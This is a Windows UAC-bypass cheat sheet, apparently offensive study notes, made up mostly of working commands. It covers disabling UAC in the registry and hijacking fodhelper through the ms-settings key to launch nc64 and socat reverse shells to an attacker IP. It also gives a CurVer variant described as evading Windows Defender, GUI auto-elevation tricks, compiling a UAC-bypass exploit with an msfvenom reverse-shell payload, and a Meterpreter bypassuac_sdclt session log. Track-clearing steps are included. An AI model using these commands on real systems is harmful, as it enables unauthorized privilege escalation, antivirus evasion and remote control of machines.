## Check UAC Level
```
To confirm if UAC is enabled do:
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
    
    If 0 then, UAC won't prompt (like disabled)
    If 1 the admin is asked for username and password to execute the binary with high rights (on Secure Desktop)
    If 2 (Always notify me) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
    If 3 like 1 but not necessary on Secure Desktop
    If 4 like 2 but not necessary on Secure Desktop
    if 5(default) it will ask the administrator to confirm to run non Windows binaries with high privileges
    
Then, you have to take a look at the value of LocalAccountTokenFilterPolicy
If the value is 0, then, only the RID 500 user (built-in Administrator) is able to perform admin tasks without UAC, and if its 1, all accounts inside "Administrators" group can do them.    

And, finally take a look at the value of the key FilterAdministratorToken
If 0(default), the built-in Administrator account can do remote administration tasks and if 1 the built-in account Administrator cannot do remote administration tasks, unless LocalAccountTokenFilterPolicy is set to 1.

Summary
If EnableLUA=0 or doesn't exist, no UAC for anyone
If EnableLua=1 and LocalAccountTokenFilterPolicy=1 , No UAC for anyone
If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=0, No UAC for RID 500 (Built-in Administrator)
If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=1, UAC for everyone

All this information can be gathered using the metasploit module: post/windows/gather/win_privs

You can also check the groups of your user and get the integrity level:
net user %username%
whoami /groups | findstr Level
```

## Disable UAC in Registry
```
# try to disable UAC
cmd> reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /d 0 /t REG_DWORD
```

## Fodhelper
```
Fodhelper
Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating-system characteristics. Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won’t be prompted for elevation when performing standard administrative tasks. While we’ve already taken a look at an autoElevate executable, unlike msconfig, fodhelper can be abused without having access to a GUI.

Fodhelper
Bypass using Fodhelper: 
fodhelper.exe is a Windows default executable that is required for managing optional Windows features, additional languages, etc.
It is also an automatically executable program.
This means that the administrator will not be prompted by UAC to perform elevated tasks. 
We can performed if there are restrictions to GUI.  

Start Run and type “fodhelper.exe” to open Fodhelper. 

For example, say if we are opening a html file. 
The windows will go to registry > HKEY_CLASSES_ROOT to check for which client application is must be used to open it. 
The command is defined in ‘shell\open\command’ subkey i.e., the iexplore.exe. 

We can then change the data of the value named ‘DelegateExecute’ in the registry within the “HKCU\Software\Classes\ms-settings\Shell\Open\command” for the fodhelper to replace with our own script to get a reverse shell. 
Let’s say an attacker managed to attack the machine and get an administrator level account, but if UAC is restricting from performing an elevated execution.  
C:\> set SHELL="powershell -windowstyle hidden C:\Tools\nc64.exe <ATTACKER_IP> 443"

We can create a malicious script to provide a reverse shell back to the attacker machine and store it in an Environment variable.
C:\> reg add “HKCU\Software\Classes\ms-settings\Shell\Open\command” /v "DelegateExecute" /d "" /f
Create an empty value named “DelegateExecute” inside the registry key “HKCU\Software\Classes\ms-settings\Shell\Open\command”.

So that the system-wide association can be used at HKLU (HKEY_LOCAL_USER) instead of user-specific association based at HKCU (HKEY_CURRENT_USER). In other words
C:\> reg add %REG_KEY% /d %SHELL% /f

We can check by running ‘Registry Editor’ in windows to check if the key values are updated in ‘HKCU\Software\Classes\ms-settings\Shell\Open\command’.

Example:
# UAC BYPASS using Fodhelper.exe or Computer Defaults.exe
where /r C:\windows fodhelper.exe
where /r C:\windows computerdefaults.exe

New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value {C:\Users\Public\Downloads\revshell.exe} -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
cmd

powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
powershell Start-Process C:\windows\system32\computerdefaults.exe -WindowStyle Hidden

Example:
 As user is medium integrity level member we can inject payload and make to communicate to parent
 We can set required registry value to the ms-settings class to get a reverse connection by using reverse shell. 
 here i’m going to use socat and set registry as below :
 
 C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
 C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
 C:\> reg add %REG_KEY% /v “DelegateExecute” /d “” /f
 C:\> reg add %REG_KEY% /d %CMD% /f

As above we are using socat which is type of reverse shell connection , and we will setup listener at attacker end to obtain a high privilege reverse shell connection.

Kali Box: socat TCP4-LISTEN:443,fork STDOUT
Windows Box: socat -d -d TCP4:<attacker ip>:443 EXEC:'cmd.exe',pipes 

Clearing our tracks
reg delete HKCU\Software\Classes\ms-settings\ /f
execute the command and clear artifacts and interference with all tasks

```

## Bypassing Windows Defender (CurVer)
```
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD=”powershell -windowstyle hidden C: \Tools\nc64.exe -e cmd.exe 10.10.31.232 443"
C:\> reg add %REG_KEY% /v “DelegateExecute” /d “” /f
C:\> reg add %REG_KEY% /d %CMD% /f

Trying Fodhelper it looks like Windows Defender is able to flag this as a malicious activity for modifying the registry value. 

How do we bypass common AntiVirus checks? 

We can make use of CurVer. So CurVer is a value used in ProgID that specifies the default version of the application to be used when opening a certain file type in Windows.
What we do is create a new ProgID entry in the registry with our own choice of name.
Then point that CurVer entry in ms–settings‘s ProgID to the new ProgID that we created.

C:\> $program = "powershell -windowstyle hidden C:\Windows\System32\cmd.exe"
C:\> New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
C:\> Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
C:\> New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
C:\> Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".hack" -Force
C:\> Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

So, what this script does is create a new progID with the name “.hack” and then directly associate the payload with the command used when opening such files. which then points the CurVer entry of ms-settings to our “.hack” progID. When fodhelper tries opening an ms-settings program, it will instead be pointed to the “.hack” program ID and use its associated command. 
```

## PowerShell Disable UAC
```
Powershell disable UAC
Disable UAC
function Disable-UserAccessControl {
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 00000000
    Write-Host "User Access Control (UAC) has been disabled." -ForegroundColor Green    
}
```

## msconfig    
```
Case study : msconfig
Spawn run and enter msconfig
There are exemptions that allow certain program binaries to execute without prompts, in this case, msconfig
    Now navigate to “Tools” and launch

We will obtain a high IL command prompt without interacting with UAC in any way.
```

## asman.msc
```
asman.msc
Case Study : azman.msc (Authorization manager)
    As with msconfig, azman.msc will auto elevate without requiring user interaction. 
    If we can find a way to spawn a shell from within that process, we will bypass UAC. 
    Note that, unlike msconfig, azman.msc has no intended built-in way to spawn a shell.
    
first spawn run and run  azman.msc
    To run shell we will abuse the application’s help    
        We will right-click any part of the help menu, you can click on “help topics', then right click and ”view source",  select view source
```

## Notepad
```
Notepad        
This will spawn a notepad process that we can leverage to get a shell. 
 go to File->Open and make sure to select All Files in the combo box on the lower right corner. 
 Go to C:\Windows\System32 and search for cmd.exe and open the program       
 This will open cmd.exe at a high privsec level.
```

## UAC-bypass.c (https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c)
```
check if UAC turned on
cmd> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA                  REG_DWORD 0x1 # if 0x1 = UAC ENABLED
ConsentPromptBehaviorAdmin REG_DWORD 0x5 # if NOT 0x0 = consent required
PromptOnSecureDesktop      REG_DWORD 0x1 # if 0x1 = Force all credential/consent prompts

try to disable UAC
cmd> reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /d 0 /t REG_DWORD

STEP 2: Prepare exploits

# modify uac-bypass.c to execute reverse shell
# compile w/ correct architecture
$ x86_64-w64-mingw32-gcc ~/OSCP-2022/Tools/privesc-windows/uac-bypass.c -o uac-bypass.exe  <-- https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c

# generate reverse shell payload
$  msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[kali] LPORT=666 -f exe -o rshell.exe

STEP 3: Transfer, setup listener and exec payload

cmd> copy \\[kali]\[share]\uac-bypass.exe uac-bypass.exe
cmd> copy \\[kali]\[share]\rshell.exe rshell.exe
cmd> .\uac-bypass.exe
```

## Meterpreter UAC Bypass
```
There are several post-exploitation modules we can deploy against an active meterpreter session.
Sessions that were created through attack vectors such as the execution of a client-side attack will likely provide us only with an unprivileged shell.
But if the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we can bypass User Account Control (UAC)
Enter getsystem to elevate our privileges. Then, we use ps to identify the process ID of OneDrive.exe, and migrate to it.

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > ps
8044   3912  OneDrive.exe                 

meterpreter > migrate 8044
[*] Migrating from 9020 to 8044...
[*] Migration completed successfully.

While this is an administrative account, UAC prevents us from performing administrative operations.
Before we attempt to bypass UAC, let's confirm that the current process has the integrity level Medium.
To display the integrity level of a process, we can use tools such as Process Explorer or third-party PowerShell modules such as NtObjectManager. 
Once we import the module with Import-Module,4 we can use Get-NtTokenIntegrityLevel5 to display the integrity level of the current process by retrieving and reviewing the assigned access token.

meterpreter > shell
Process 6436 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager

PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
Medium

Next, let's background the currently active channel and session to search for and leverage UAC post-exploitation modules.

PS C:\Windows\system32> ^Z
Background channel 1? [y/N]  y

meterpreter > bg
[*] Backgrounding session 9...

Now let's search for UAC bypass modules:
msf6 exploit(multi/handler) > search UAC

The search yields quite a few results.
One very effective UAC bypass on modern Windows systems is exploit/windows/local/bypassuac_sdclt, which targets the Microsoft binary sdclt.exe.
This binary can be abused to bypass UAC by spawning a process with integrity level High

To use the module, we'll activate it and set the SESSION and LHOST options as shown in the following listing. Setting the SESSION for post-exploitation modules allows us to directly execute the exploit on the active session. Then, we can enter run to launch the module.

Executing a UAC bypass using a Meterpreter session:
msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
msf6 exploit(windows/local/bypassuac_sdclt) > show options
msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
SESSION => 32
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.119.4
LHOST => 192.168.119.4
msf6 exploit(windows/local/bypassuac_sdclt) > run

[*] Started reverse TCP handler on 192.168.119.4:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[!] This exploit requires manual cleanup of 'C:\Users\offsec\AppData\Local\Temp\KzjRPQbrhdj.exe!
[*] Please wait for session and cleanup....
[*] Sending stage (200774 bytes) to 192.168.50.223
[*] Meterpreter session 10 opened (192.168.119.4:4444 -> 192.168.50.223:49740) at 2022-08-04 09:03:54 -0400
[*] Registry Changes Removed

Check Integrity Level:
meterpreter > shell
Process 2328 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager

PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
High

The process our payload runs in has the integrity level High and therefore we have successfully bypassed UAC.
```




